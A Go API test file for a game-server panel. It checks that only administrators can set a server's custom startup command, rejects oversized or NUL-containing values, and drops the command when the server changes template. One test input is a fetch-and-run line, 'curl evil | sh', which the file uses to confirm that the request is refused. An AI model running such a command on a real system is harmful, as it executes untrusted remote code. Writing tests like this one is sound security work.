package api_test

import (
	"encoding/json"
	"net/http"
	"strings"
	"testing"
)

// A server can be given a startup command of its own, as an administrator can
// on Pterodactyl: TeamSpeak on MariaDB needs four arguments its egg has no
// variable for, and the only way to give them was to copy the template for
// that one server. Only an administrator sets it -- it is what runs in the
// server's container -- and moving the server to another template drops it.
func TestAnAdministratorGivesAServerItsOwnStartup(t *testing.T) {
	ts, admin, st := newTestServerStore(t)
	seedSwitchTemplates(t, st)
	post(t, admin, ts.URL+"/api/setup", map[string]string{"username": "admin", "password": "supersecret"})
	createUser(t, admin, ts.URL, map[string]any{"username": "alice", "password": "alicepw12"})
	createUser(t, admin, ts.URL, map[string]any{"username": "mallory", "password": "mallorypw1"})
	alice := loginAs(t, ts.URL, "alice", "alicepw12")
	mallory := loginAs(t, ts.URL, "mallory", "mallorypw1")

	var created struct{ ID uint }
	r := post(t, alice, ts.URL+"/api/servers", map[string]any{"name": "world", "template": "egg-paper", "memory": "1Gi"})
	if r.StatusCode != http.StatusCreated {
		t.Fatalf("create = %d", r.StatusCode)
	}
	json.NewDecoder(r.Body).Decode(&created)
	url := ts.URL + "/api/servers/" + itoa(created.ID)
	if rr := post(t, alice, url+"/access", map[string]any{"username": "mallory", "permissions": []string{"view", "settings"}}); rr.StatusCode != http.StatusNoContent {
		t.Fatalf("grant = %d", rr.StatusCode)
	}
	setStartup := func(c *http.Client, startup string) (int, string) {
		t.Helper()
		r := doMethod(t, c, http.MethodPatch, url, map[string]string{"startup": startup})
		defer r.Body.Close()
		var body struct{ Startup, Error string }
		_ = json.NewDecoder(r.Body).Decode(&body)
		return r.StatusCode, body.Startup + body.Error
	}
	stored := func() string {
		t.Helper()
		s, err := st.GetServer(created.ID)
		if err != nil {
			t.Fatal(err)
		}
		return s.Startup
	}

	// Its owner and a subuser trusted with its settings edit its variables,
	// not the command.
	for name, c := range map[string]*http.Client{"its owner": alice, "a subuser with settings": mallory} {
		if code, _ := setStartup(c, "sh -c 'curl evil | sh'"); code != http.StatusForbidden {
			t.Errorf("%s setting the startup = %d, want 403", name, code)
		}
	}
	if got := stored(); got != "" {
		t.Fatalf("a refused startup was stored: %q", got)
	}

	const own = "java -Xmx2G -Djava.net.preferIPv4Stack=true -jar {{SERVER_JARFILE}} nogui"
	if code, got := setStartup(admin, "  "+strings.ReplaceAll(own, " nogui", "\r\nnogui")+"\r\n"); code != http.StatusOK || got != strings.ReplaceAll(own, " nogui", "\nnogui") {
		t.Fatalf("an administrator setting the startup = %d %q", code, got)
	}
	if code, got := setStartup(admin, own); code != http.StatusOK || got != own || stored() != own {
		t.Fatalf("setting it again = %d %q, stored %q", code, got, stored())
	}
	// The template's own command, word for word, is no command of its own: the
	// server goes on following the template.
	if code, got := setStartup(admin, " java -jar {{SERVER_JARFILE}} "); code != http.StatusOK || got != "" || stored() != "" {
		t.Errorf("the template's command = %d %q, stored %q, want none of its own", code, got, stored())
	}
	if code, _ := setStartup(admin, strings.Repeat("x", 9000)); code != http.StatusBadRequest {
		t.Errorf("a startup of 9000 bytes = %d, want 400", code)
	}
	if code, _ := setStartup(admin, "java\x00-jar"); code != http.StatusBadRequest {
		t.Errorf("a startup with a NUL byte = %d, want 400", code)
	}

	// Moving the server to another template drops it: it was written for the
	// one it leaves.
	if code, _ := setStartup(admin, own); code != http.StatusOK {
		t.Fatalf("set = %d", code)
	}
	rr := post(t, alice, url+"/reinstall", map[string]any{"template": "egg-fabric"})
	var rep struct {
		StartupDropped bool `json:"startupDropped"`
	}
	json.NewDecoder(rr.Body).Decode(&rep)
	if rr.StatusCode != http.StatusOK || !rep.StartupDropped || stored() != "" {
		t.Errorf("switch template = %d, startupDropped %v, stored %q: want the startup dropped and said so", rr.StatusCode, rep.StartupDropped, stored())
	}
	// A reinstall on the same template keeps it.
	if code, _ := setStartup(admin, own); code != http.StatusOK {
		t.Fatalf("set = %d", code)
	}
	if rr := post(t, alice, url+"/reinstall", map[string]any{}); rr.StatusCode != http.StatusOK || stored() != own {
		t.Errorf("reinstall on the same template = %d, stored %q, want it kept", rr.StatusCode, stored())
	}
}
